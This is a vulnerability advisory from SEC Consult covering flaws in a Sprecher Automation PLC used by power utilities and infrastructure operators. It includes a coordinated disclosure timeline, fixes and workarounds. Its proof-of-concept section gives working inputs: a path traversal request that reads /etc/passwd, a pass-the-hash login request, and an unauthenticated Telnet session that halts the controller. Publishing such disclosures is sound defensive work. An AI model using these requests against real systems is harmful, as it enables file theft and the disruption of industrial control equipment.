@@ -1,0 +1,298 @@
+id: 29679
+date: 01/31/2018
+title: Sprecher Automation SPRECON-E-C / PU-2433 Traversal / DoS
+author: sec-consult
+cves: 
+
+=======================================================================
+              title: Sprecher Automation SPRECON-E-C / PU-2433 Traversal / DoS
+            product: Sprecher Automation SPRECON-E-C, PU-2433
+ vulnerable version: <8.49 (most vulnerabilities, see "Vulnerable version" for
+                     details)
+      fixed version: 8.49 (most vulnerabilities, see "Solution" for details)
+         CVE number: -
+             impact: Medium
+           homepage: https://www.sprecher-automation.com
+              found: 2017-08-15
+                 by: T. Weber, C.A. (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Sprecher Automation GmbH offers switchgears and automation solutions
+for energy, industry and infrastructure processes. Our customers are
+power utilities, industries, transportation companies, municipal
+utilities and public institutions.
+
+Company-own developments and cooperations with technology
+partners lead to a unique product portfolio consisting of traditional
+electrical technologies as well as high-tech electronics."
+
+Source: https://www.sprecher-automation.com/en/
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends to immediately patch the systems and follow the
+hardening guide provided by the vendor (SEC Consult did not have access to the
+hardening guide in order to review it).
+
+A thorough security review should be performed by security professionals as
+further security issues might exist within the product.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Authenticated Path Traversal Vulnerability
+The web interface of the Sprecher PLC suffers from a path traversal
+vulnerability. A user which is authenticated on the web interface,
+which is intended as read-only interface, can download files with the
+permissions of the webserver (www-data).
+
+Files like "/etc/shadow" are not readable for the webserver.
+
+
+2) Client-Side Password Hashing
+The password hashes which are stored on the system can be directly
+used to authenticate on the web interface (pass-the-hash) since the password
+is hashed in the browser of the user during login.
+
+
+3) Missing Authentication
+The PLC exposes a Telnet management service on TCP port 2048.
+This interface can be used to control the PLC and does not require any
+authentication.
+
+
+4) Permanent Denial of Service via Portscan
+An aggressive TCP SYN scan on a large amount of ports triggers a denial
+of service of the PLC service. This results in an persistent DoS of the
+standby PLC in an active - standby pair. Manual operator intervention is
+required to restore service availability.
+
+
+5) Outdated Linux Kernel
+An ancient Linux kernel version with a high number of known security weaknesses
+is used for the PLC base operating system.
+
+
+Proof of concept:
+-----------------
+1) Authenticated Path Traversal Vulnerability
+Reading "passwd" is possible by triggering the following request:
+-------------------------------------------------------------------------------
+GET /webserver/cgi-bin/spre.cgi?4_1=../../../../../../../etc/passwd HTTP/1.1
+Host: <IP-Address>
+Cookie: sid=<SESSION-ID>
+Connection: close
+Upgrade-Insecure-Requests: 1
+-------------------------------------------------------------------------------
+
+The file is directly fetched from the system:
+-------------------------------------------------------------------------------
+root:x:0:0:root:/root:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:100:sync:/bin:/bin/sync
+mail:x:8:8:mail:/var/spool/mail:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+operator:x:37:37:Operator:/var:/bin/sh
+haldaemon:x:68:68:hald:/:/bin/sh
+dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
+nobody:x:99:99:nobody:/home:/bin/sh
+sshd:x:103:99:Operator:/var:/bin/sh
+[...]
+-------------------------------------------------------------------------------
+
+
+2) Client-Side Password Hashing
+The passwords are hashed in JavaScript before they are transmitted to the
+device. Therefore the hash is as good as the password.
+
+The following request shows a login process:
+-------------------------------------------------------------------------------
+POST /webserver/cgi-bin/spre.cgi HTTP/1.1
+Host: <IP-Address>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: application/json
+Accept-Language: de
+Content-Type: application/x-www-form-urlencoded
+If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT
+Referer: http://<IP-Address>/Webserver.html?locale=de
+Content-Length: 57
+Connection: close
+
+cgi_time&user=admin&pswd=<md5-hash>
+-------------------------------------------------------------------------------
+
+
+3) Missing Authentication
+An administrative interface was presented after connecting to port 2048 via
+Telnet:
+$ telnet <IP-Address> 2048
+
+100 OK: Portable IEC 61131-3 RT Scheduler for Linux (RTK) $Revision: 1.17 $
+        Scheduling mode: application timer/timer-tick preserving
+        Copyright (c) kirchner SOFT GmbH 1994-2002. All rights reserved.
+HELP
+104 OK: Portable IEC 61131-3 RT Scheduler for Linux (RTK) $Revision: 1.17 $
+        Scheduling mode: application timer/timer-tick preserving
+        Copyright (c) kirchner SOFT GmbH 1994-2002. All rights reserved.
+          HELP, ? .......................... show this help
+          QUIT, EXIT ....................... quit command session
+          STOP ............................. stop execution
+          CONT [TASK|EP] <id> .............. continue execution
+          STRT ............................. start system
+          REST ............................. restart system if breaked
+          HALT ............................. quit scheduler
+          SHOW [TASKS|SCHED|REVISIONS] ..... show information
+          SHOW [BREAKPOINTS] ............... show breakpoint list
+          EXEC <TASK> <id> ................. execute a task
+          EXEC_MS <ms> [flags] ............. execute code for a specific time
+          EXEC_CYCLES <no> [flags] ......... execute code for cycles
+          STEP TASK <id> <INTO|OVER|OUT> ... single step (task)
+          STEP EP <id> <INTO|OVER|OUT> ..... single step (task of EP)
+          ADD_BREAKPOINT <bp> .............. add breakpoint
+          DELETE_BREAKPOINT <bp|ALL> ....... delete breakpoints
+          ENABLE_BREAKPOINT <bp|ALL> ....... enable breakpoints
+          DISABLE_BREAKPOINT <bp|ALL> ...... disable breakpoints
+          READ <variable> .................. read variable as string
+          READ_LONG <variable> ............. read variable as long
+          READ_DOUBLE <variable> ........... read variable as double
+          WRITE <variable> <value> ......... write variable with string const.
+          WRITE_LONG <variable> <value> .... write variable with long value
+          WRITE_DOUBLE <variable> <value> .. write variable with double value
+          GET_LONGNAME <variable> .......... get variable information
+          GET_TYPENAME <variable> .......... get variable information
+          CHECK_VAR <variable> ............. check if variable exists
+          USER name ........................ identify user
+          PASS pw .......................... authenticate with password
+          BIN .............................. switch to binary protocol mode
+
+The PLC can be restarted with the "HALT" command (PLC returns after about 30 seconds):
+
+HALT
+200 OK: shutting down application tasks
+201 OK: waiting for application tasks
+202 OK: shutting down system
+Connection closed by foreign host.
+
+
+4) Permanent Denial of Service via Portscan
+An aggressive portscan triggered a persistent denial of service of the standby PLC
+in an active - standby setup.
+
+
+5) Outdated Linux Kernel
+By using the path traversal vulnerability (1) the Linux kernel version has been
+retrieved:
+-------------------------------------------------------------------------------
+Linux version 2.6.20-sp16 (kd@jeannie) (gcc version 4.4.6 (Buildroot 2011.05))
+#1 PREEMPT Mon Feb 29 12:06:28 CET 2016
+-------------------------------------------------------------------------------
+
+
+Vulnerable versions:
+-----------------------------
+The following versions are affected by the identified vulnerabilities:
+1) Authenticated Path Traversal Vulnerability
+all versions < 8.49
+
+2) Client-Side Password Hashing
+all versions < 8.49
+
+3) Missing Authentication
+all versions
+
+4) Permanent Denial of Service via Portscan
+all versions
+
+5) Outdated Linux Kernel
+all versions < 8.49
+
+
+Vendor contact timeline:
+------------------------
+2017-09-22: Requesting vendor security contact and encryption keys
+2017-09-25: Vendor provides S/MIME certificate for encryption
+2017-09-25: Advisory is submitted to the vendor
+2017-09-25: Call with vendor contact. Contact states that the vulnerabilities
+            are known and fixed in different newer firmware versions.
+            Contact will provide a list of firmware versions with the fixes.
+2017-10-02: Requesting update.
+2017-10-02: Vendor states they will provide feedback by the following week.
+2017-10-12: SEC Consult sends reminder for requested information.
+2017-10-13: Vendor states they will provide missing information until 2017-10-20.
+2017-10-20: Vendor requested some more time (2017-11-03) to prepare hardening
+            guide to be linked in advisory.
+2017-11-03: Vendor provides affected and fixed versions, workaround information
+            and reference to hardening guideline
+2018-01-29: Vendor provides an update regarding the hardening guide document ID.
+            It was changed to from 94.2.915.95 to 94.2.913.50.
+2018-01-30: Vendor requested changes for the "passwd" file in the advisory.
+            Removed the Vendor-specific user accounts in the PoC.
+2018-01-31: Coordinated public release.
+
+
+Solution:
+---------
+1) Authenticated Path Traversal Vulnerability
+Fixed in version 8.49 (available since 2016-05-13)
+
+2) Client-Side Password Hashing
+Fixed in version 8.49 (available since 2016-05-13)
+
+3) Missing Authentication
+see workaround
+
+4) Permanent Denial of Service via Portscan
+see workaround
+
+5) Outdated Linux Kernel
+Fixed in version 8.49 (available since 2016-05-13)
+
+
+Workaround:
+-----------
+1) Authenticated Path Traversal Vulnerability
+As a workaround, if a firmware update is not feasible due to operational constraints,
+the webserver can be deactivated. The webserver is not necessary for operation,
+as all maintenance can be done via the SPRECON-E service program.
+
+2) Client-Side Password Hashing
+see (1)
+
+
+3) Missing Authentication
+Remote debugging of the Software-PLC is possible via the "secure service channel"
+instead of this Telnet service.
+The optional Telnet service can be disabled to mitigate this vulnerability.
+(According to the vendor it is disabled by default.)
+
+See the vendor's hardening guideline available for all registered customers:
+https://download.sprecher-automation.com/de/login (document ID 94.2.913.50).
+
+
+4) Permanent Denial of Service via Portscan
+According to the vendor the denial of service via portscan can be mitigated using
+the packet filter.
+
+See the vendor's hardening guideline available for all registered customers:
+https://download.sprecher-automation.com/de/login (document ID 94.2.913.50).
+
+
+5) Outdated Linux Kernel
+no workaround available
+
+#  0day.today [2023-03-24]  #
